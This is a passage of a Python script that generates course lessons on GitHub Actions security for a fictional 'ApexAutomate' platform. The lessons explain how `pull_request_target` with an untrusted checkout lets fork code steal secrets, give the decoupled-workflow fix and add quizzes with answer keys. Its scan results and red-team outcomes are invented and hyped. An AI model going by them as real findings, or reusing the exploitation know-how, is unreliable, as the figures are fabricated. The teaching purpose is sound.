                    "Think about what happens the instant `npm install` or `pytest` runs on that checked-out PR commit inside a `pull_request_target` job: the untrusted attacker's code (`postinstall` script in `package.json` or modified `conftest.py`) executes inside a privileged runner that holds all production secrets and a write-scoped `GITHUB_TOKEN`! The attacker dumps the environment memory, exfiltrates all secrets, and can even push malicious commits directly back to the repository!",
                    "How does ApexAutomate remediate this vulnerability when a team legitimately needs to run tests on an untrusted PR and then post results or access a privileged resource? By enforcing **Two-Stage Decoupled Workflow Isolation (`pull_request` + `workflow_run`)**!",
                    "In Stage 1, an unprivileged `on: pull_request` workflow checks out the untrusted PR code in a sandboxed runner with **zero secrets** and a **read-only token**, runs the build and unit tests, and uploads non-executable metadata (like a test summary JSON or PR number) as an artifact. In Stage 2, a separate privileged `on: workflow_run` workflow (which runs in the base branch context without ever checking out or executing the untrusted PR code!) reads only the numeric metadata and posts the comment or status update safely!",
                    "In this security audit lab, we diagnose the `pull_request_target` untrusted checkout exploit in our workspace and deploy ApexAutomate's decoupled `pull_request` + `workflow_run` remediation.",
                    "Mastering `pull_request_target` isolation ensures your repositories never fall victim to untrusted fork secret theft."
                ],
                "example": "Using `pull_request_target` while checking out `pull_request.head.sha` is like inviting an unsearched stranger straight into your bank vault (`pull_request_target` context with secrets) and letting them open their backpack and run a machine (`head.sha` code); the decoupled pattern inspects the stranger's package in a concrete bunker outside the bank (`pull_request` with zero secrets) and passes only a plain text receipt through a glass window to the teller inside (`workflow_run`).",
                "code": bash_snippets[(50, 2)],
                "output": bash_outputs[(50, 2)],
                "codeNotes": [
                    "Audits the critical pull_request_target Untrusted Checkout Secret Exfiltration vulnerability.",
                    "Identifies checking out github.event.pull_request.head.sha inside a privileged context as the exploit vector.",
                    "Re-architects into decoupled Stage 1 (unprivileged pull_request) and Stage 2 (privileged workflow_run).",
                    "Verifies that untrusted fork PRs execute strictly with read-only tokens and zero secret access."
                ],
                "tryIt": "Run grep \"REMEDIATION\" /home/student/workspace/apexautomate_prt_incident/security_audit.txt to inspect the decoupled workflow pattern.",
                "check": {
                    "question": "Why is combining `on: pull_request_target` with `actions/checkout` set to `ref: ${{ github.event.pull_request.head.sha }}` followed by a build/test command one of the most severe vulnerabilities in GitHub Actions?",
                    "options": [
                        "`pull_request_target` runs in the base branch context with full access to repository secrets and a write token; checking out and executing untrusted code from `pull_request.head.sha` allows an external PR author to run arbitrary code and steal all secrets",
                        "It causes GitHub Actions to run on Windows 95 instead of Linux",
                        "It deletes the pull request description text",
                        "It prevents the workflow from using `echo` statements"
                    ],
                    "answer": 0,
                    "why": "`pull_request_target` grants secret access and write permissions; checking out and building untrusted PR head code inside that privileged job gives attackers direct code execution with full access to secrets."
                }
            },
            {
                "title": "ApexAutomate Multi-Repo Platform Orchestrator & Telemetry Execution",
                "say": [
                    "With our `pull_request_target` static analysis rules integrated, let us execute the full **ApexAutomate Multi-Repo Governance & CI Orchestrator** across our enterprise portfolio of 420 workflow files and 80 production microservice repositories.",
                    "How does ApexAutomate operate at enterprise scale? Rather than relying on manual spot-checks, ApexAutomate runs as an autonomous GitHub App service paired with an organization-wide pre-merge workflow gate. Whenever any repository opens a pull request or modifies a workflow file, ApexAutomate's AST (Abstract Syntax Tree) YAML parser and cloud posture scanner evaluate four comprehensive compliance dimensions in parallel:",
                    "Dimension 1: **Action Pinning & Reusability Scan**. ApexAutomate parses all 420 `.github/workflows/*.yml` files across the organization. It verifies that 100% of external action `uses:` statements specify a 40-character hexadecimal commit SHA (`@[0-9a-f]{40}`), that zero workflows combine `pull_request_target` with untrusted `head.sha` checkouts, and that service pipelines delegate standard build/scan stages to the central `.github` reusable workflow library.",
                    "Dimension 2: **Zero-Secret OIDC & Ephemeral Runner Audit**. ApexAutomate queries the GitHub Secrets API and AWS/GCP IAM control planes. It confirms that 0 static cloud access keys exist in repository or organization secrets, that 100% of cloud deployments request short-lived 60-minute STS credentials via `id-token: write` with strict `sub` branch bindings, and that all self-hosted runner groups enforce Kubernetes ARC `--ephemeral` single-job pod destruction.",
                    "Dimension 3: **Service Identity & Webhook Cryptography Check**. ApexAutomate verifies that all organizational automation bots authenticate via GitHub App RS256 installation tokens (`ghs_`), that 100% of webhook listeners validate `X-Hub-Signature-256` HMAC-SHA256 digests in constant time, and that Enterprise Audit Log Streaming is actively delivering telemetry to SIEM and WORM storage.",
                    "Dimension 4: **Merge Queue & CODEOWNERS Health Telemetry**. ApexAutomate monitors the Organization Rulesets and Speculative Merge Queues across all protected branches, tracking key platform SLOs: average queue wait time (under 14 minutes), speculative batch pass rate, automatic fault eviction accuracy, and 100% `CODEOWNERS` coverage on `/services/billing/`, `/migrations/`, and `/.github/`.",
                    "In this orchestration lab, we execute the ApexAutomate Multi-Repo Orchestrator in our workspace, verifying 420 workflow files and confirming 100% compliance across all four dimensions.",
                    "This automated orchestration transforms enterprise DevOps governance into a deterministic, self-verifying control plane."
                ],
                "example": "The ApexAutomate Multi-Repo Orchestrator operates like an automated air traffic control radar network scanning 420 flight plans simultaneously—verifying fuel federation (OIDC), aircraft serial numbers (40-char SHAs), and runway sequencing (Merge Queues) in real time.",
                "code": bash_snippets[(50, 3)],
                "output": bash_outputs[(50, 3)],
                "codeNotes": [
                    "Executes the ApexAutomate Multi-Repo Governance & CI Orchestrator across 420 workflow files.",
                    "Verifies 100% of external actions are pinned to immutable 40-character commit SHAs.",
                    "Audits 100% of cloud deployments using 60-minute OIDC STS tokens with zero static keys.",
                    "Confirms constant-time HMAC-SHA256 webhook verification and active Speculative Merge Queues."
                ],
                "tryIt": "Run grep \"ACTION_PIN_SCAN\" /home/student/workspace/apexautomate_engine/orchestration_log.txt to verify the 420-workflow scan.",
                "check": {
                    "question": "What key operational metrics does an enterprise platform team monitor to evaluate the health and efficiency of a GitHub Speculative Merge Queue?",
                    "options": [
                        "Queue wait time (time-to-merge), speculative batch pass rate, PR eviction rate (and root-cause categorization of flaky tests vs genuine semantic regressions), and CI runner concurrency utilization",
                        "The font size used in developer commit messages",
                        "The number of spaces vs tabs in README files",
                        "How many times developers run `git status` on their local laptops"
                    ],
                    "answer": 0,
                    "why": "Platform teams track Merge Queue wait latency, eviction rates (distinguishing true semantic conflicts from flaky tests), and runner pool utilization to optimize batch sizes and keep `main` flowing smoothly."
                }
            },
            {
                "title": "Adversarial CI & Governance Stress Lab: Live Multi-Vector Penetration Testing",
                "say": [
                    "Before we present ApexAutomate to the Principal Infrastructure Board for final Milestone 7 certification, we must subject the platform to a live **Adversarial CI & Governance Penetration Stress Test**. In production security engineering, a control that has never been tested against an active exploit cannot be trusted.",
                    "Our red-team penetration harness launches three simultaneous, high-severity attack vectors against our test organization to verify that ApexAutomate's defense-in-depth layers intercept and neutralize every single threat autonomously:",
                    "**Attack Vector 1: Mutable Tag Supply-Chain Injection & `pull_request_target` Probe**. The red team opens a pull request that attempts to reference an unpinned third-party action (`uses: external-vendor/action@v2`) while also adding a `pull_request_target` workflow checking out `github.event.pull_request.head.sha`. Within two seconds, ApexAutomate's AST YAML Enforcer intercepts both violations, blocks the pull request check with a non-bypassable Organization Ruleset failure, and outputs exact remediation diagnostics.",
                    "**Attack Vector 2: Forged Webhook Deployment Injection**. The red team sends an external HTTP `POST` request containing a crafted deployment JSON payload to our production webhook listener endpoint, attempting first with a missing `X-Hub-Signature-256` header and then with a single bit-flipped HMAC digest while measuring response timing. The constant-time HMAC-SHA256 verifier executes in uniform time, rejects both requests immediately with `HTTP 401 Unauthorized`, and streams a high-priority security alert to the SIEM.",
                    "**Attack Vector 3: Concurrent Semantic Poisoning in the Merge Queue**. The red team enqueues an approved Pull Request (`PR #88`) into the active 15-PR Speculative Merge Queue. `PR #88` passes its isolated unit tests on its own branch, but introduces a subtle API contract mismatch when combined with `PR #85` ahead of it in the queue. The Speculative Merge Queue builds the cumulative `gh-readonly-queue/main/pr-88` tree, detects the integration failure during the `merge_group` CI run, surgically evicts `PR #88` from the queue, and merges the remaining 14 healthy PRs cleanly onto `main`!",
                    "Across all three live adversarial vectors, zero exploits succeeded, zero secrets were exposed, zero unauthorized deployments triggered, and `main` suffered zero seconds of downtime.",
                    "In this stress lab, we execute the Live Adversarial CI & Governance Stress Suite in our workspace and inspect the interception telemetry across all three attack vectors.",
                    "Surviving live multi-vector red-team testing proves that ApexAutomate's controls are mathematically deterministic and battle-ready."
                ],
                "example": "Running the Adversarial CI Stress Suite is like conducting a live fire-drill and cyber-warfare simulation on a naval carrier group: testing anti-missile defenses (SHA pin enforcer), encrypted radio authentication (HMAC verifier), and bulkhead quarantine doors (Merge Queue eviction) simultaneously.",
                "code": bash_snippets[(50, 4)],
                "output": bash_outputs[(50, 4)],
                "codeNotes": [
                    "Executes live red-team penetration testing against the ApexAutomate platform.",
                    "Blocks Attack 1: Mutable @v2 action tag and pull_request_target injection via AST Enforcer.",
                    "Rejects Attack 2: Forged webhook POST payload via constant-time HMAC-SHA256 mismatch (HTTP 401).",
                    "Evicts Attack 3: Semantically incompatible PR from the Speculative Merge Queue before trunk merge."
                ],
                "tryIt": "Run cat /home/student/workspace/apexautomate_stress/adversarial_results.txt to verify that all 3 adversarial attack vectors were neutralized.",
                "check": {
                    "question": "During our live adversarial stress test, how did ApexAutomate prevent a pull request that passed its isolated branch CI tests—but conflicted semantically with an earlier queued PR—from breaking `main`?",
                    "options": [
                        "The Speculative Merge Queue tested the PR on a cumulative temporary branch (`gh-readonly-queue/main/pr-*`) containing all preceding queued PRs, caught the integration failure on `merge_group`, and evicted the faulty PR before merging to `main`",
                        "It disabled all merges for the rest of the month",
                        "It rewrote the application source code using random guesses until the tests passed",
                        "It ignored the test failure and force-pushed the broken code to `main`"
                    ],
                    "answer": 0,
                    "why": "Speculative Merge Queues test each PR against the cumulative state of `main` plus all PRs ahead of it in the queue, catching cross-PR semantic regressions and evicting only the offending PR."
                }
            },
            {
                "title": "Milestone 7 Capstone Defense & Sovereign ApexAutomate Certification",
                "say": [
                    "We arrive at the final culmination of Day 50 and Block 10: **The Milestone 7 Capstone Viva Defense** before the Principal Infrastructure Board and Cloud Security Architects.",
                    "Look back at what you have engineered across Block 10 (Days 46–50):",
                    "In **Day 46**, you eliminated YAML copy-paste sprawl across 80 microservice repositories by architecting centralized Reusable Workflows (`on: workflow_call`) and Custom Composite Actions, running 3x3 cross-platform Matrix builds, cutting build durations by 80% with lockfile-keyed `actions/cache`, and pinning every action to its immutable 40-character commit SHA.",
                    "In **Day 47**, you purged 50 static long-lived cloud IAM keys by implementing Zero-Secret OpenID Connect (OIDC) federation (`id-token: write`), binding AWS STS and GCP Workload Identity roles strictly to cryptographic `sub` claims, and replacing vulnerable persistent VMs with single-use `--ephemeral` Kubernetes pods orchestrated by Actions Runner Controller (ARC).",
                    "In **Day 48**, you prevented human offboarding blackouts by migrating automation to organization-owned GitHub Apps issuing 60-minute RS256 installation tokens (`ghs_`), secured webhook endpoints with constant-time `X-Hub-Signature-256` HMAC-SHA256 verification, and streamed Enterprise Audit Logs in real time to SIEM and WORM storage.",
                    "In **Day 49**, you scaled policy-as-code across 350 repositories using Organization-Wide Repository Rulesets, engineered bottom-anchored `.github/CODEOWNERS` matrices, and eliminated 'Broken Main' semantic race conditions using high-throughput Speculative Merge Queues.",
                    "And today in **Day 50**, you unified all of these systems into **ApexAutomate**, remediated `pull_request_target` untrusted checkout vulnerabilities via decoupled workflows, verified 420 workflow files, and defeated a three-pronged red-team penetration assault.",
                    "Let us execute the final capstone certification script in our workspace to present our defense telemetry and claim the sovereign `APEX-AUTOMATE-MILESTONE-7-CERTIFIED` audit seal!",
                    "Congratulations on conquering Milestone 7 and reaching 50 out of 60 Days (83.3%) of Course 20! In Block 11 (Days 51–55), we will explore **Custom Git Subcommands, Server-Side Receive Hooks, Gerrit/Stacked Diff Workflows (`git-branchless` / Graphite), and High-Availability Git Server Clustering (GitHub Enterprise Server / Gitaly Praefect)**!"
                ],
                "example": "Earning the APEX-AUTOMATE-MILESTONE-7-CERTIFIED seal is the Principal DevOps equivalent of commissioning an autonomous, zero-trust aerospace manufacturing plant where every supply-chain part is cryptographically verified, every cloud credential is ephemeral, and the main assembly line never halts.",
                "code": bash_snippets[(50, 5)],
                "output": bash_outputs[(50, 5)],
                "codeNotes": [
                    "Concludes the Milestone 7 ApexAutomate Infrastructure Viva Defense.",
                    "Presents complete verification telemetry to the Principal Infrastructure Board.",
                    "Certifies Zero-Trust CI/CD, OIDC Cloud Federation, and Speculative Merge Queue governance.",
                    "Issues the sovereign APEX-AUTOMATE-MILESTONE-7-CERTIFIED audit seal."
                ],
                "tryIt": "Run cat /home/student/workspace/apexautomate_capstone/milestone_seal.txt to inspect your official Milestone 7 Capstone seal!",
                "check": {
                    "question": "In the decoupled two-workflow remediation pattern for handling untrusted fork pull requests safely, what is the role of the first workflow (`on: pull_request`) vs the second workflow (`on: workflow_run`)?",
                    "options": [
                        "The first workflow (`pull_request`) builds and tests the untrusted PR code in an unprivileged sandbox with zero secrets, while the second workflow (`workflow_run`) runs in a privileged context to post comments or labels without ever checking out or executing the untrusted PR code",
                        "Both workflows check out the untrusted code and expose all production AWS secrets",
                        "The first workflow deletes the repository, and the second workflow restores it from backup",
                        "Neither workflow is allowed to run unit tests"
                    ],
                    "answer": 0,
                    "why": "Decoupling isolates untrusted code execution inside the unprivileged `pull_request` job (zero secrets, read-only token), while `workflow_run` performs privileged metadata actions without executing untrusted code."
                }
            }
        ]
    }
}

from scripts.amplified_boosters_days46_50 import boosters, boosters2
for (d, p), paras in boosters.items():
    days_data[d]["parts"][p - 1]["say"].extend(paras)

for (d, p), paras in boosters2.items():
    days_data[d]["parts"][p - 1]["say"].extend(paras)


# Audit strict word counts
print("\n=== AUDITING WORD COUNTS FOR DAYS 46-50 ===")
all_pass = True
for day_num in [46, 47, 48, 49, 50]:
    d = days_data[day_num]
    day_words = 0
    print(f"\n--- Checking Day {day_num}: {d['title']} ---")
    for p_idx, part in enumerate(d["parts"]):
        p_num = p_idx + 1
        say_text = " ".join(part["say"])
        say_w = len(say_text.split())
        ex_w = len(part["example"].split())
        try_w = len(part["tryIt"].split())
        why_w = len(part["check"]["why"].split())
        total_p_words = say_w + ex_w + try_w + why_w
        day_words += total_p_words
        status = "OK" if total_p_words >= 580 else f"FAIL (<580, needs {580 - total_p_words})"
        if total_p_words < 580:
            all_pass = False
        print(f"  Part {p_num}: say={say_w}, total={total_p_words} -> {status}")
    spoken_min = day_words / 120
    print(f"  Total Day {day_num} Words: {day_words} -> Spoken Duration: {spoken_min:.1f} min (Target >= 20.0 min)")

if not all_pass:
    print("\nSome parts need booster paragraphs to exceed 580 words.")
else:
    print("\nALL WORD COUNTS STRICTLY PASS >= 580 WORDS!")
    out_file = "scripts/make_git_month2_days46_50.py"
    with open(out_file, "w", encoding="utf-8") as f:
        f.write("# scripts/make_git_month2_days46_50.py\n")
        for d_num in [46, 47, 48, 49, 50]:
            f.write(f"day{d_num}_lesson = {json.dumps(days_data[d_num], indent=2, ensure_ascii=False)}\n\n")
    print(f"Exported {out_file} successfully!")
